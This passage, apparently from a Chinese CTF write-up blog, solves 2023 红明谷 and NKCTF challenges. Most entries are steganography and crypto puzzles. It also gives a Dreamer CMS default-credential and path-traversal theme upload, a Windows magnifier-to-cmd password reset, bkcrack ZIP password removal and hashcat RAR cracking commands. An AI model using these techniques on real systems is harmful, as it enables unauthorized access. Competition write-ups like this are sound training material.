class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure><h2 id="X光的秘密"><a href="#X光的秘密" class="headerlink" title="X光的秘密"></a>X光的秘密</h2><p>给了个<code>task.dcm</code>文件，百度到能打开的软件<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p><p>使用软件导出，一共有二十张</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-1.png"></p><p>使用stegsolve发现最后三张图存在LSB</p><p>脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure><p>img-00001-00018.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure><p>img-00001-00019.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure><p>img-00001-00020.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure><p>将三张图片按顺序拼接发现刚好是<code>10001001</code>，<code>0x89</code>为<code>PNG</code>的头</p><p>使用脚本合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-2.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>签到，点点点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-1.png"></p><h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>参考<a href="https://forum.butian.net/share/2183#/">Dreamer CMS 代码审计</a></p><p>默认后台管理员账号密码为<code>wangjn/123456</code></p><p>在源码中复制一份<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>，修改<code>theme.json</code>文件中的<code>themePath</code>为<code>../../../../../../../../../../../</code>，然后打包成压缩包，在后台<code>风格管理</code>处上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-1.png"></p><p>启用后在<code>模板管理</code>处就可以看到跟目录下的文件了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-2.png"></p><p><code>Dreamer_revenge</code>的步骤与<code>Dreamer</code>一致，不过flag在<code>/proc/1/environ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-3.png"></p><h2 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h2><p>EyouCMS v1.6.1 反序列化漏洞</p><p>参考<a href="https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/">EyouCMS v1.6.1 0day挖掘</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;阿尼亚&quot;&gt;&lt;a href=&quot;#阿尼亚&quot; class=&quot;headerlink&quot; title=&quot;阿尼亚&quot;&gt;&lt;/a&gt;阿尼</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="红明谷" scheme="https://www.dr0n.top/tags/%E7%BA%A2%E6%98%8E%E8%B0%B7/"/>
    
  </entry>
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="https://www.dr0n.top/posts/50c22730/"/>
    <id>https://www.dr0n.top/posts/50c22730/</id>
    <published>2023-03-26T13:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.931Z</updated>
    
    <content type="html"><![CDATA[<p>rank：15</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p><p>复制一份cmd到放大镜</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p><p>进入系统</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p><h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>频谱找到<code>PSdB:74208645</code></p><p>波形转换得到<code>psdA:83979367</code></p><p>导出flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p><h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">参考文章</a></p><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p><h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p><p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p><p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p><p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p><p>放大图片观察到很多像素点，提取然后拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p><h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p><p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p><p>6位数字爆破，得到<code>114514</code></p><p>提示1：<code>“CA1N”也很“疑惑”呢</code></p><p>猜测是要对文件异或</p><p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p><p>得到一个加密的压缩包，根据提示2<code>ZipCrypto</code>，猜测是深入明文攻击</p><p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-1.png"></p><p>改密码</p><p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p><p>解压出来一个<code>handsome.jpg</code>和带密码的<code>5.rar</code></p><p>自拍照并没什么用，hashcat爆破<code>rar</code></p><p>rar2john提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p><p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p><p>最终得到密码<code>BUSADJ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-4.png"></p><p>解压出的图片尾藏了一个逆序的png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 